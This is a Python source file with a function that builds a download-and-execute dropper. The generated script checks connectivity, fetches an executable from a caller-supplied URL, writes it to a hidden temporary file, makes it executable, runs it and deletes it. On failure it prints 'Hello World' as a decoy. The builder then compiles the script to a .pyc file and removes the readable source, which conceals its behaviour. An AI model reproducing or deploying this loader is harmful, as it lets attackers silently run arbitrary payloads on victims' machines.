import py_compile, os

def create_bytecode(download_link):
    code = r'''import requests, os

def main():
    try:
        requests.get("https://www.google.com", timeout=5)
    except requests.exceptions.Timeout:
        print("Request timed out 🐢")
        return
    except:
        print("no internet 🐒")
        return
    tmp_file = False
    i = 0
    try:
        executable = requests.get("{URL}").content
        while os.path.exists(f".tmp{i}"):
            i += 1
        with open(f".tmp{i}", "wb") as f:
            f.write(executable)
        # TODO: VM STUFF SO YOU CAN RUN ON WINDOWS
        tmp_file = True
        os.system(f"chmod +x ./.tmp{i}")
        os.system(f"./.tmp{i}")
        os.remove(f"./.tmp{i}")
        tmp_file = False
    except:
        if tmp_file:
            os.remove(f"./.tmp{i}")
        print("Hello World")

if __name__ == "__main__":
    main()
'''.replace("{URL}", download_link)

    with open("bytecode.py", "w") as f:
        f.write(code)
    
    py_compile.compile("bytecode.py", cfile="bytecode.pyc")
    os.remove("bytecode.py")
    return "bytecode.pyc"
